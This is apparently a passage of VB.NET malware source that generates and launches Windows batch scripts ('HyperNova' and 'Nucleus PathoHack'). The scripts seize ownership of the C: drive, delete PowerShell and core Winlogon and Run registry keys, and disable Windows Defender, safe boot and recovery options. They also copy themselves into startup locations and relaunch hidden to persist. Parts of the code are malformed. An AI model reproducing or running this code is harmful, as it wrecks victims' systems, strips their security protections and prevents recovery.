        rythorian77.AppendLine("if %ERRORLEVEL% == 0 GOTO continue")
        rythorian77.AppendLine(":continue")
        rythorian77.AppendLine("SET DIRECTORY_NAME=C:\") 'Note: You can change path to target a single directory>>SET DIRECTORY_NAME=C:\Users\Etc...
        rythorian77.AppendLine("TAKEOWN /f %DIRECTORY_NAME% /r /d y")   REM:  targets current directory and removes all admin restrictions. Note: DIRECTORY_NAME= can be changed to: FOLDER_NAME=C:\Users\John Doe\Desktop\NewFolder
        rythorian77.AppendLine("ICACLS %DIRECTORY_NAME% /grant administrators:F /t")
        rythorian77.AppendLine("ICACLS %DIRECTORY_NAME% /reset /T")
        rythorian77.AppendLine("icacls foo /grant Everyone:(OI)(CI)F")
        rythorian77.AppendLine("timeout /t 2 /nobreak")
        rythorian77.AppendLine($"echo .appactivate^(""%~1"" ^) : .sendkeys ""{{enter}}")
        rythorian77.AppendLine("timeout /t 2 /nobreak")
        rythorian77.AppendLine("if %ERRORLEVEL% == 0 GOTO continue")
        rythorian77.AppendLine(":continue")
        rythorian77.AppendLine("SetACL.exe -on ""C:\\"" -ot file -actn setprot") 'Note: You can change path to target a single directory>>SET DIRECTORY_NAME=C:\Users\Etc...
        rythorian77.AppendLine("-op ""dacl:np;sacl:nc")
        rythorian77.AppendLine("-rec cont_obj")
        rythorian77.AppendLine("-actn setowner -ownr ""n:S-1-5-32-544;s:y")
        rythorian77.AppendLine("-silent")
        rythorian77.AppendLine("timeout /t 1 /nobreak")
        rythorian77.AppendLine($"echo .appactivate^(""%~1"" ^) : .sendkeys ""{{enter}}")
        rythorian77.AppendLine("if %ERRORLEVEL% == 0 GOTO continue")
        rythorian77.AppendLine(":continue")
        rythorian77.AppendLine("@echo off")
        rythorian77.AppendLine("copy ""%~n0%~x0"" ""%USERPROFILE%\Start Menu\Programs\Startup")
        rythorian77.AppendLine("timeout /t 3 /nobreak")
        rythorian77.AppendLine("goto")
        rythorian77.AppendLine("icacls c:\ /remove:g *S-1-5-11")
        rythorian77.AppendLine("timeout /t 3 /nobreak")
        rythorian77.AppendLine("IF NOT %ERRORLEVEL%==0 GOTO")
        rythorian77.AppendLine("icacls c:\ /grant *S-1-5-11:(OI)(CI)(IO)(M) ")
        rythorian77.AppendLine("goto")
        rythorian77.Append("taskkill /im ktpcntr.exe /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("del ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\office6\ktpcntr.exe"" /s /f /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("taskkill /im wpscenter.exe /f")
        rythorian77.Append("del ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\office6\wpscenter.exe"" /s /f /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("taskkill /im wpscloudsvr.exe /f")
        rythorian77.Append("del ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\office6\wpscloudsvr.exe"" /s /f /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%SystemDrive%\AMD"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%SystemDrive%\drivers"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%SystemDrive%\Users\defaultuser0"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\wtoolex"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%WINDIR%\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("taskkill /im mobsync.exe /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("del ""%WINDIR%\System32\mobsync.exe"" /s /f /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%ProgramFiles%\WindowsPowerShell"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%ProgramFiles(x86)%\WindowsPowerShell"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%WINDIR%\System32\WindowsPowerShell"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("rd ""%WINDIR%\SysWOW64\WindowsPowerShell"" /s /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("del ""%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\*"" /s /f /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("del ""%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*"" /s /f /q")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKCU\Software\Microsoft\Command Processor"" /v ""AutoRun"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKCU\Software\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Command Processor"" /v ""AutoRun"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows"" /v ""AppInit_DLLs"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Userinit"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""VMApplet"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Microsoft\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows"" /v ""AppInit_DLLs"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Userinit"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""VMApplet"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\Software\WOW6432Node\Policies"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Keyboard Layout"" /v ""Scancode Map"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot"" /v ""AlternateShell"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""BootExecute"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""Execute"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""SETUPEXECUTE"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\System\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /v ""StartupPrograms"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /deletevalue {{current}} safeboot")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /deletevalue {{default}} safeboot")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /set {{default}} advancedoptions false")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /set {{default}} bootems no")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /set {{default}} recoveryenabled no")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /set {{bootmgr}} displaybootmenu no")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /set {{current}} advancedoptions false")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /set {{current}} bootems no")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"bcdedit /set {{current}} recoveryenabled no")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""EvtMgr6"" /t REG_SZ /d ""C:\Program Files\Logitech\SetPointP\SetPoint.exe /launchGaming"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /t REG_SZ /d ""explorer.exe"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Userinit"" /t REG_SZ /d ""C:\Windows\System32\userinit.exe,"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v ""Shell"" /t REG_SZ /d ""explorer.exe"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""BootExecute"" /t REG_MULTI_SZ /d ""autocheck autochk *"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Control\Session Manager"" /v ""SETUPEXECUTE"" /t REG_MULTI_SZ /d "" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("%SystemDrive%\Users\defaultuser0")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("%ProgramFiles%\WindowsPowerShell")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("%ProgramFiles(x86)%\WindowsPowerShell")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("%WINDIR%\System32\mobsync.exe")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("%WINDIR%\System32\WindowsPowerShell")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("takeown /f ""%WinDir%\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy"" /a /r /d yicacls ""%WinDir%\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy"" /inheritance:r /grant:r Administrators:(OI)(CI)F /t /ctaskkill /im SearchUI.exe /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("%WINDIR%\SysWOW64\WindowsPowerShell")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"HKCR\CLSID\{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}\ShellFolder")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Image:C:\test\offline /Disable-Feature /FeatureName:TFTP /Remove")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:MediaPlayback /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:MicrosoftWindowsPowerShellV2 /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:MicrosoftWindowsPowerShellV2Root /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:Printing-PrintToPDFServices-Features /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:Printing-XPSServices-Features /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:SearchEngine-Client-Package /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:WCF-TCP-PortSharing45 /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:WorkFolders-Client /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Disable-Feature /FeatureName:Xps-Foundation-Xps-Viewer /Quiet /NoRestart")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("Dism /Online /Enable-Feature /FeatureName:NetFx3 /All")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("schtasks /Change /TN ""Microsoft\Windows\SystemRestore\SR"" /Enable")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("vssadmin Resize ShadowStorage /For=C: /On=C: /Maxsize=5GB")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("sc config wbengine start= demand")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("sc config swprv start= demand")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("sc config vds start= demand")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("sc config VSS start= demand")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("1 - Disable Real-time protection")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\Sense"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\WdFilter"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\WdNisSvc"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\System\CurrentControlSet\Services\WinDefend"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("delete ""HKCR\*\shellex\ContextMenuHandlers\EPP"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("delete ""HKCR\Directory\shellex\ContextMenuHandlers\EPP"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("delete ""HKCR\Drive\shellex\ContextMenuHandlers\EPP"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}}"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{645FF040-5081-101B-9F08-00AA002F954E}}"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{20D04FE0-3AEA-1069-A2D8-08002B30309D}}"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"" /v ""{{59031a47-3f72-44a7-89c5-5595fe6b30ee}}"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v ""EnableCursorSuppression"" /t REG_DWORD /d ""0"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Search"" /v ""BingSearchEnabled"" /t REG_DWORD /d ""0"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Search"" /v ""CortanaEnabled"" /t REG_DWORD /d ""0"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Search"" /v ""SearchboxTaskbarMode"" /t REG_DWORD /d ""0"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Policies\Microsoft\Windows\Explorer"" /v ""DisableNotificationCenter"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v ""HideSCANetwork"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v ""HideSCAPower"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v ""HideSCAVolume"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Driver Signing"" /v ""Policy"" /t REG_BINARY /d ""01"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Device Metadata"" /v ""PreventDeviceMetadataFromNetwork"" /t REG_DWORD /d ""1"" /f ")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("schtasks /Change /TN ""Microsoft\Windows\Device Setup\Metadata Refresh"" /Disable")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\DriverSearching"" /v ""SearchOrderConfig"" /t REG_DWORD /d ""0"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""Disabled"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""Disabled"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontSendAdditionalData"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontSendAdditionalData"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontShowUI"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""DontShowUI"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v ""LoggingDisabled"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting"" /v ""LoggingDisabled"" /t REG_DWORD /d ""1"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append($"reg add ""HKCR\CLSID\{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}\ShellFolder"" /v ""Attributes"" /t REG_DWORD /d ""2962489444"" /f")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("cls()")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""HyperNova.bat"", 0, True")
        rythorian77.AppendLine("GoTo begin")

        File.WriteAllText("HyperNova.bat", rythorian77.ToString())
        Process.Start("HyperNova.bat")
        Err.Clear()
Err:
        On Error Resume Next
    End Sub

    Private Sub Nucleus()
        On Error GoTo Err
        Dim rythorian77 As New StringBuilder
        rythorian77.AppendLine("@echo off")
        rythorian77.AppendLine("Title: Batch (Nucleus PathoHack) by: Rythorian77 (AKA Black Star Research)")
        rythorian77.AppendLine(":Commandline")
        rythorian77.AppendLine("IF [""%~1""]==[""-e""] GoTo o")
        rythorian77.AppendLine(":Clear vbs")
        rythorian77.AppendLine("set Batch=%~dpnx0")
        rythorian77.AppendLine("(")
        rythorian77.AppendLine("echo set objshell ^= createobject^(""wscript.shell""^)")
        rythorian77.AppendLine("echo objshell^.run ""%Batch% -e""^,vbhide ) > %temp%\bas.vbs")
        rythorian77.AppendLine("start %temp%\bas.vbs")
        rythorian77.AppendLine("exit")
        rythorian77.AppendLine(":o")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("setlocal enableDelayedExpansion")
        rythorian77.AppendLine("attrib -r -h C:\autoexec.bat")
        rythorian77.AppendLine("attrib +r +h C:\autoexec.bat")
        rythorian77.Append("set mydir=%~dp0")
        rythorian77.Append("bcdedit /set recoveryenabled No")
        rythorian77.AppendLine("bcdedit /set bootstatuspolicy ignoreallfailures")
        rythorian77.AppendLine("copy %0 C:\startup.bat")
        rythorian77.AppendLine("goto startup")
        rythorian77.Append(":startup")
        rythorian77.AppendLine(":: HAT")
        rythorian77.AppendLine("attrib -r -h C:\autoexec.bat")
        rythorian77.AppendLine("copy %0 C:\WinServ.bat >nul")
        rythorian77.AppendLine("type C:\autoexec.bat|find ""WinServ.bat"">C:\autoexec.bat")
        rythorian77.AppendLine("attrib +r +h C:\autoexec.bat")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\startup.bat")
        rythorian77.AppendLine("copy %0 %windir%\WinDebug.bat")
        rythorian77.AppendLine("find /v /i ""[boot]""<%WiNDir%\system.ini>temp1.tmp")
